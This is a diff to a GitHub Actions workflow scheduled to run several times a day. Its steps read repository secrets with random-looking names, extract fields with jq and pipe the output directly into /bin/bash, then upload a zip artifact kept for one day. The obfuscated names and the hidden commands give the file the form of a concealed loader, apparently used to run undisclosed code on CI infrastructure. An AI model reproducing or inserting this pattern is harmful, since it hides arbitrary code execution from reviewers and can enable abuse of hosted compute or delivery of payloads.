@@ -1,19 +1,28 @@
 name: zhongcheshengshi
-
 on:
   workflow_dispatch:
+
   schedule:
-    - cron: '46 1/6 * * *'
-jobs:  # 8665
+    - cron: '21 3,9,15,21 * * *'
+jobs:
   build:
     runs-on: ubuntu-latest
     steps:
       - uses: actions/checkout@v4
       - name: zhongcheshengshi
         env:
-          ig7: ${{ secrets.ig7 }}
+          qpeu8: ${{ secrets.qpeu8 }}
         run: |
-          echo $ig7 | jq -r .ldds1828 | /bin/bash
-          echo $rzgfc2 | jq -r .gvq5 | /bin/bash
-          echo $dwa411 | jq -r .mkk396 | /bin/bash
+          printf '%s' "$qpeu8" | jq -r .p6316 | /bin/bash
+          echo $rtcs4 | jq -r .mxl3551 | /bin/bash
+          printf '%s' "$wmbbj61" | jq -r .zhkwm995 | /bin/bash
+          printf '%s' "$j8554" | jq -r .pxsg15 | /bin/bash
+          printf '%s' "$usstp49511" | jq -r .n7 | /bin/bash
+          printf '%s' "$ecehs539" | jq -r .skln5352 | /bin/bash
 
+      - name: Upload artifact
+        uses: actions/upload-artifact@v4
+        with:
+          name: fj1FmMIj
+          path: "*.zip"
+          retention-days: 1
